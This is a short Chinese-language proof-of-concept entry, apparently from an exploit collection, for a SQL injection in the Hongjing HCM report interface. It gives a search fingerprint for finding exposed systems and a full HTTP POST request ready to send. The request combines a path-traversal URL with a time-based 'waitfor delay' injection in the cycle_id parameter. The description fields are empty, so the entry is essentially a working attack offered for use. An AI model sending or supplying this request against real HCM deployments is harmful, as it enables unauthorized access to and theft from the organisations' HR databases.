﻿# 宏景HCM-report 接口 SQL注入漏洞

> 更新时间：2024-03-20

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：app:"宏景 HCM"

> 验证脚本：HTTP

```
POST /templates/attestation/../../report/report_collect/report_org_collect_tree.jsp HTTP/1.1
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: JSESSIONID=C79DED09D8CE46170DEB697EA6999135
Connection: close
Content-Type: application/x-www-form-urlencoded

params=&isAction=2&cycle_id=2;waitfor%20delay%20'0:0:5'--%20
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：宏景HCM-report 接口 SQL注入漏洞.poc

